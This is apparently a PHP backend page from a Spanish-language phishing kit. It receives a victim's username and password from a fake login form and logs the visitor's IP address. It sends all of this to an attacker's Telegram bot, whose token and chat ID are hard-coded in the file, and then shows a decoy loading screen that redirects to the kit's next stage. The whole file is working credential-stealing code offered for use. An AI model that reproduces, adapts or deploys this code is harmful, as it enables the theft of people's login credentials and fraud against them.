<?php
    session_start();


    if(isset($_POST['gtrip01']) && isset($_POST['gtrip02'])){

        $_SESSION['cont'] = 3;
        @$_SESSION['tlg1'] = "6755720052:AAGTUPeVMgjNVah3rQ_LcXar6VhbvUYut80";
        @$_SESSION['cht1'] = "-4208407233";

        @$_SESSION['ips'] = '';

        if( !empty($_SERVER['REMOTE_ADDR']) ){

            $_SESSION['ips'] = 'IP: '.$_SERVER['REMOTE_ADDR']." - ";
            
        }else{
            if( !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) 
            $_SESSION['ips'] = 'IP: '.$_SERVER['HTTP_X_FORWARDED_FOR']." - ";
        }
        
        $_SESSION['u1'] = $_POST['gtrip01'];
        $_SESSION['p1'] = $_POST['gtrip02'];

        $msg = "--------CUSC---------\n";
        $msg .= "IP:".$_SESSION['ips']."\n";
        $msg .= "U:".$_SESSION['u1']."\n";
        $msg .= "P:".$_SESSION['p1']."\n";

        $bt_tkn = $_SESSION['tlg1'];
        $url = "https://api.telegram.org/bot$bt_tkn/sendMessage";
        $datos = array('chat_id' => $_SESSION['cht1'], 'text' => $msg);
        $options = array('http' => array('method' => 'POST', 'content' => http_build_query($datos)));
        $context = stream_context_create($options);
        @$rstd = file_get_contents($url, false, $context);

        header('Refresh: 19; URL=./1.php');
    }else{
        session_destroy();
        header('Refresh: 0; URL=./index2.html');
    }

?>
<!DOCTYPE html>
<html lang="es"><head>
    <meta charset="utf-8">  
    <title>En línea</title>
    <link rel="stylesheet" href="./sldr/style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  </head>
  <body style="background:#f2f2f2;">
    <style>*{margin:0px;padding:0px;}</style>
    <div id="main" style="background:#f2f2f2;">
      <nav id="nav1" style="background:#ffffff;height: 64px;display: flex;">
        <img id="lg1" src="./logo.png" alt="Home" style="height: 35px;align-self: center;margin-left: 10px;">
      </nav>
        
      <img class="icnimgs" src="./im/icn/top-left.png" style="position:absolute;top:120px;left:20%;width: 64px;height: 64px;">
      <img class="icnimgs" src="./im/icn/center-left.png" style="position:absolute;height:130px;top:260px">
      <img class="icnimgs" src="./im/icn/bottom-left.png" style="position:absolute; top: 510px;left: 10%;width: 90px;">
      <img class="icnimgs" src="./im/icn/top-right.png" style="position:absolute;right: 0;top: 82px;height: 220px;max-height: 100%;">
      <img class="icnimgs" src="./im/icn/center-right.png" style="position:absolute;top: 300px;right: 15%;width: 90px;">
      <img class="icnimgs" src="./im/icn/bottom-right.png" style="position:absolute;right: 0;bottom: 20px;width: 65px;">
      <style>
        @media  screen and (max-width:860px) {
          .icnimgs{
            display: none;
          }
        }
      </style>

      <div id="gtrx" style="text-align:center">
        <div id="gtr01" style="margin-top: 20px;display: inline-block; width: 310px;height:500px;background-image:url('./im/cont.svg');background-repeat:no-repeat;">
            <div style="
    display: inline-block;
    margin-top: 145px;
    margin-left: -10px;
    background: #fff;
    height: 55px;
    width: 55px;
    border-radius: 110%;
    padding: 21px;
    border: 7px solid #0A486A;
">
                <img src="./im/p.gif" style="
    height: 24px;
    position: relative;
    top: 24%;
    left: 0%;
">
            </div>
        </div>
        
    </div>


    </div>


    
    
  
</body></html>